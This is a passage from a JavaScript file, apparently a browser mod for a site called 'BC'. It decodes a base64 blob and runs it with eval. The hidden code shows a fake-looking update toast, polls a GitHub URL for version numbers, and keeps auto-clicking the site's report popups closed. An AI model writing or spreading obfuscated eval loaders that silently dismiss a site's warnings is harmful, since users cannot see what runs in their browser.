lsZChjbG9zZUJ1dHRvbik7CmNsb3NlQnV0dG9uLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgZnVuY3Rpb24oKSB7CiAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIwIjsKICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogICAgdG9hc3RDb250YWluZXIuc3R5bGUuZGlzcGxheSA9ICJub25lIjsKICB9LCA1MDApOwp9KTsKdmFyIGljb24gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJpbWciKTsKaWNvbi5zcmMgPSAiaHR0cHM6Ly9tZWRpYS5kaXNjb3JkYXBwLm5ldC9hdHRhY2htZW50cy83ODE3NDkyMjkzMzE5MzkzMjgvMTA3OTY1OTAxNjkxOTE5NTc0OC9iNjY0MTkxMTc4OTdhOTg4LnBuZz93aWR0aD0xMTkwJmhlaWdodD0xMTg5IjsKaWNvbi5zdHlsZS53aWR0aCA9ICIyM3B4IjsKaWNvbi5zdHlsZS5oZWlnaHQgPSAiMjNweCI7Cmljb24uc3R5bGUuYm9yZGVyUmFkaXVzID0gIjUwJSI7Cmljb24uc3R5bGUubWFyZ2luUmlnaHQgPSAiLTMwcHgiOwppY29uLnN0eWxlLm1hcmdpbkJvdHRvbSA9ICItNXB4IjsKdG9hc3RDb250YWluZXIuYXBwZW5kQ2hpbGQoaWNvbik7CgovLyBVcGRhdGUgY2xpZW50IG1lc3NhZ2UKdmFyIHRleHQgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCJzcGFuIik7CnRleHQuc3R5bGUuZm9udFdlaWdodCA9ICJib2xkIjsKdGV4dC5zdHlsZS5tYXJnaW5MZWZ0ID0gIjM1cHgiOwp0ZXh0LmlubmVySFRNTCA9ICJOZXcgdXBkYXRlIGRldGVjdGVkLCByZWZyZXNoIEJDIHRvIHVwZGF0ZSB0byBWMi4wLjciOwp0b2FzdENvbnRhaW5lci5hcHBlbmRDaGlsZCh0ZXh0KTsKCmRvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQodG9hc3RDb250YWluZXIpOwoKc2V0VGltZW91dChmdW5jdGlvbigpIHsKICB0b2FzdENvbnRhaW5lci5zdHlsZS5kaXNwbGF5ID0gImJsb2NrIjsKICB0b2FzdENvbnRhaW5lci5zdHlsZS5vcGFjaXR5ID0gIjEiOwp9LCAwKTsKCnNldFRpbWVvdXQoZnVuY3Rpb24oKSB7CiAgdG9hc3RDb250YWluZXIuc3R5bGUub3BhY2l0eSA9ICIwIjsKfSwgNTAwMDAwMCk7CgpzZXRUaW1lb3V0KGZ1bmN0aW9uKCkgewogIHRvYXN0Q29udGFpbmVyLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7Cn0sIDU1MDAwMDApOwoKfQoKICAvLyBFbmQgb2YgVXBkYXRlIFRvYXN0X19fX19fX19fX19fX19fXwoKICBjb25zdCBlbGVtZW50VG9SZW1vdmUgPSBkb2N1bWVudC5xdWVyeVNlbGVjdG9yKCdkaXZbc3R5bGU9InBvc2l0aW9uOiBhYnNvbHV0ZTsgaW5zZXQ6IDUlOyBiYWNrZ3JvdW5kOiB3aGl0ZTsgZGlzcGxheTogZmxleDsgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsgcGFkZGluZzogMWVtOyJdJyk7CgogIHNldEludGVydmFsKGZ1bmN0aW9uKCkgewogICAgY29uc3QgZWxlbWVudFRvUmVtb3ZlID0gZG9jdW1lbnQucXVlcnlTZWxlY3RvcignZGl2W3N0eWxlPSJwb3NpdGlvbjogYWJzb2x1dGU7IGluc2V0OiA1JTsgYmFja2dyb3VuZDogd2hpdGU7IGRpc3BsYXk6IGZsZXg7IGZsZXgtZGlyZWN0aW9uOiBjb2x1bW47IHBhZGRpbmc6IDFlbTsiXScpOwogICAgaWYgKGVsZW1lbnRUb1JlbW92ZSkgewogICAgICBjb25zdCBidXR0b25zID0gZWxlbWVudFRvUmVtb3ZlLnF1ZXJ5U2VsZWN0b3JBbGwoJ2J1dHRvbltzdHlsZT0iY3Vyc29yOiBwb2ludGVyOyJdJyk7CiAgICAgIGlmIChidXR0b25zKSB7CiAgICAgICAgYnV0dG9ucy5mb3JFYWNoKGJ1dHRvbiA9PiBidXR0b24uY2xpY2soKSk7CiAgICAgIH0KICAgIH0KICB9LCAxKTsKICBzZXRJbnRlcnZhbChmdW5jdGlvbigpIHsKICAgIGNvbnN0IGVsZW1lbnRUb1JlbW92ZSA9IGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3IoJ2RpdltzdHlsZT0icG9zaXRpb246IGFic29sdXRlOyBpbnNldDogNSU7IGJhY2tncm91bmQ6IHdoaXRlOyBkaXNwbGF5OiBmbGV4OyBmbGV4LWRpcmVjdGlvbjogY29sdW1uOyBwYWRkaW5nOiAxZW07Il0nKTsKICAgIGlmIChlbGVtZW50VG9SZW1vdmUpIHsKICAgICAgY29uc3QgYnV0dG9ucyA9IGVsZW1lbnRUb1JlbW92ZS5xdWVyeVNlbGVjdG9yQWxsKCdidXR0b25bc3R5bGU9ImN1cnNvcjogcG9pbnRlcjsiXScpOwogICAgICBpZiAoYnV0dG9ucykgewogICAgICAgIGJ1dHRvbnMuZm9yRWFjaChidXR0b24gPT4gewogICAgICAgICAgaWYgKGJ1dHRvbi50ZXh0Q29udGVudCA9PT0gIkRvIG5vdCBzaG93IHRoaXMgcmVwb3J0IGFnYWluIHVubGVzcyBzb21ldGhpbmcgY2hhbmdlcyIgfHwgYnV0dG9uLnRleHRDb250ZW50ID09PSAiQ2xvc2UiKSB7CiAgICAgICAgICAgIGJ1dHRvbi5jbGljaygpOwogICAgICAgICAgfQogICAgICAgIH0pOwogICAgICB9CiAgICB9CiAgfSwgNTAwKTsKCiAgLy8gIFVSTCBvZiB0aGUgdXBkYXRlIHBhZ2UKY29uc3QgdXJsID0gJ2h0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9CQ01TNy9CQ00vbWFpbi91cGRhdGVtYW5hZ2VyLmpzJzsKY29uc3QgbWF4VmVyc2lvbiA9IDE1OwpsZXQgYWxlcnRUcmlnZ2VyZWQgPSBmYWxzZTsKZnVuY3Rpb24gY2hlY2tWZXJzaW9uKCkgewogIGZldGNoKHVybCkKICAgIC50aGVuKHJlc3BvbnNlID0+IHJlc3BvbnNlLnRleHQoKSkKICAgIC50aGVuKHZlcnNpb24gPT4gewogICAgICBpZiAocGFyc2VJbnQodmVyc2lvbikgPiBtYXhWZXJzaW9uICYmICFhbGVydFRyaWdnZXJlZCkgewogICAgICAgIHNob3dUb2FzdFVwZGF0ZSgpOwogICAgICAgIGFsZXJ0VHJpZ2dlcmVkID0gdHJ1ZTsKICAgICAgfQogICAgfSkKICAgIC5jYXRjaChlcnJvciA9PiBjb25zb2xlLmVycm9yKGVycm9yKSk7Cn0KLy8gQ2hlY2sgZm9yIHVwZGF0ZXMgZXZlcnkgNSBzZWNvbmRzCnNldEludGVydmFsKGNoZWNrVmVyc2lvbiwgNTAwMCk7Cn0KfSkKCgo=')
if (sprc) {
eval(sprc);
}
/*
41
*/
